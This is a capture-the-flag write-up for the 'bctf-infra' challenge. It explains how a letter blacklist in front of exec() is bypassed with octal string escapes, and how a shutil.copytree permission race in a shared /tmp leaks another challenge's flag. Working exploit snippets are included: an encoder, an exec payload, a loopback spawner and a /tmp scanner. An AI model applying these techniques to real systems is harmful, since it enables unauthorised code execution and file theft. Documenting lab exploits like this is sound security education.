# bctf-infra

**Category:** Misc

## Description
> No organizer description was included in the distributed artifacts.

## Overview
This challenge is an infrastructure bug, not a direct break of `chal3`. `chal1`'s blacklist only removes the literal characters `e` and `o`, but still passes quoted strings, backslashes, and digits into `exec(inp)`, so octal escapes recover unrestricted Python execution. The solve uses that primitive to connect back to the local challenge dispatcher, mass-spawn `chal3`, and race `shutil.copytree()` while `chal3`'s directory is copied into `/tmp`, allowing a transient read of the real `flag.txt`.

## Technical details
The intended isolation model is per-challenge UID separation plus directory permissions. The Dockerfile creates one Unix user per challenge, recursively re-owns each challenge directory, and then locks the directory itself to `0700`:

```python
chown -R "$user:$user" "$folder"
chmod 700 "$folder"
```

That means `chal1` should not be able to traverse `/srv/app/chals/chal3`, even though `flag.txt` itself is copied from a normal file and remains readable once a directory search path exists. The backend then handles a client-selected challenge in `run_challenge()`:

```python
uid = pwd.getpwnam(challenge).pw_uid
gid = grp.getgrnam(challenge).gr_gid
os.setgid(gid)
os.setuid(uid)

root = Path("/tmp/" + os.urandom(8).hex())
root.mkdir()
shutil.copytree(CHAL_FOLDER / challenge, root / "app")
subprocess.run([root / "app/chal.py"], cwd=root / "app", ...)
```

The exact root cause is the non-atomic staging step at `challenge_server.py:23-29`: the service copies the challenge directory into a shared writable `/tmp` before launching it. Under Python 3.13, `shutil._copytree()` first creates the destination directory and only applies the source directory metadata at the end:

```python
os.makedirs(dst, exist_ok=dirs_exist_ok)
...
copystat(src, dst)
```

So there is a race window where `/tmp/<rand>/app` already exists and `flag.txt` has been copied into it, but the copied directory has not yet inherited the source directory's restrictive `0700` mode. Because the challenge jail mounts a shared writable `/tmp` for all challenge processes in the same namespace,

```python
mount {
  dst: "/tmp"
  fstype: "tmpfs"
  rw: true
}
```

another process inside the jail can enumerate `/tmp` and attempt to open `/tmp/<rand>/app/flag.txt` before `copystat()` closes the window.

The attacker-controlled input that reaches this bug comes from `chal1`. Its filter is:

```python
allowed_chars = (string.ascii_lowercase + string.punctuation + string.digits).translate(
    str.maketrans("", "", "eo")
)
...
exec(inp)
```

This is not a real sandbox. The input cannot contain literal `e` or `o`, but it can contain quotes, backslashes, brackets, underscores, and digits. Python string literals therefore reconstruct banned identifiers with octal escapes, e.g. `'\145\170\145\143' == "exec"`. The solve uses:

```python
return f"vars(__builtins__)['{enc(b'exec')}']('{enc(INNER.encode())}')".encode()
```

which resolves to `vars(__builtins__)['exec']('<octal-encoded Python>')` at runtime. That yields arbitrary Python execution inside the `chal1` process.

That primitive is sufficient because the challenge frontend itself is just a loopback client to the internal dispatcher:

```python
/app/challenge_server.py &
...
nc 127.0.0.1 1337
```

So code running inside `chal1` can open its own connections to `127.0.0.1:1337`, request `chal3`, and create many concurrent `run_challenge("chal3", ...)` workers. `chal3` is not directly exploitable because it only accepts whitespace before `exec(inp)`:

```python
allowed_chars = string.whitespace
...
exec(inp)
```

Its only valuable asset is the real flag file copied into `/tmp`. The exploit chain is therefore:

1. Abuse `chal1`'s weak blacklist to obtain arbitrary Python.
2. From that Python, repeatedly request `chal3` over the internal loopback service.
3. Simultaneously scan the shared `/tmp` for freshly copied `/tmp/<rand>/app/flag.txt`.
4. Read the file during the `copytree()` permission window and print it back over the original `chal1` socket.

## Proof-of-Concept
- Step 1: Turn `chal1`'s blacklist into unrestricted Python execution by encoding forbidden identifiers as octal string escapes.

```python
def enc(bs: bytes) -> str:
    return "".join(f"\\{b:03o}" for b in bs)

payload = f"vars(__builtins__)['{enc(b'exec')}']('{enc(INNER.encode())}')".encode()
```

Artifact: the service executes the attacker-supplied `INNER` program even though the transport string contains no literal `e` or `o`. This upgrades `chal1` from "filtered input" to arbitrary Python code execution.

- Step 2: Use that code execution to create many local `chal3` instances through the internal dispatcher.

```python
def fire():
    s = socket.create_connection(("127.0.0.1", 1337), timeout=0.05)
    s.sendall(b"chal3\n")
    s.close()
```

Artifact: each call forces `challenge_server.py` to run `run_challenge("chal3", ...)`, which repeatedly creates new `/tmp/<rand>/app` trees and therefore repeatedly opens the `copytree()` race window.

- Step 3: Scan `/tmp` for a copied `chal3` flag before directory metadata is tightened.

```python
for d in os.listdir("/tmp"):
    p = f"/tmp/{d}/app/flag.txt"
    data = open(p).read()
    if data.startswith("bctf{"):
        print(data, flush=True)
        stop.set()
```

Artifact: once the scanner lands on a `chal3` copy between `os.makedirs(dst)` and `copystat(src, dst)`, `open(p)` returns the real flag from `chal3/flag.txt`. The `startswith("bctf{")` check filters out the fake flags from `chal1` and `chal2`.

- Step 4: Deliver the race payload through `chal1` and stop when the flag appears on the original socket.

```python
sock.sendall(b"chal1\n")
sock.sendall(payload + b"\n")
match = re.search(rb"bctf\{[^}\r\n]+\}", data)
```

Artifact: the outer solver receives the printed flag over `chal1`'s stdout/stderr pipe and terminates as soon as a `bctf{...}` token is observed. No shell or secondary primitive is required; the race directly yields the win condition.

## P/S
The exploit is only reliable because it runs the racing logic from inside the jail, not from the remote client. That removes internet latency from the critical path and lets the solver use tight local loops against `127.0.0.1` and `/tmp`, which is enough to hit the `copytree()` window consistently.
